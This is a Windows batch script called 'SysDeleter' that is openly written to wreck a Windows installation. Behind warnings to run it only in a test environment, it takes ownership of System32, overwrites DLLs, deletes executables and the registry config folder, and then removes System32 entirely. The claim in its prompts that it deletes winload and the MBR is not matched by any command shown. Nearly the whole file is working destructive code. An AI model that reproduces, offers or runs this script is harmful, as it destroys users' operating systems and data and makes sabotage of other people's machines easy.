::WARNING: If you're viewing this form notepad, THIS DELETES SYSTEM32, PLEASE DELETE THIS BATCH.
::RUN IN A SAFE TEST ENIVOREMT
@echo off
echo Loading.
cls
title SysDeleter - WARNING - RUN IN A SAFE TEST ENIVOREMT
echo THIS CORRUPTS SYSTEM32 FR, CLOSE THIS BATCH NOW IF YOU DON'T WANT A CORRUPT MACHINE.
pause
title SysDeleter - LAST WARNING - RUN IN A SAFE TEST ENIVOREMT
echo ARE YOU SURE? THIS ALSO DELETES WINLOAD AND THE MBR ITSELF
pause
title SysDeleter - Taking Ownership
cd C:\Windows\
takeown /f System32 /r /d y
title SysDeleter - Corrupting DLL's
cd C:\Windows\System32
echo OVERWRITTEN BY SYSDELETER!!!> *.dll
title SysDeleter - Deleting Executables
cd C:\Windows\System32
del *.exe
title SysDeleter - Deleting Regirsty Configs
cd C:\Windows\System32
rmdir /s /q config
title SysDeleter - Deleting regedit
cd C:\Windows
takeown /f regedit /r /d y
pause
echo Are you ready (Y\N)?
pause
rmdir /s /q System32
pause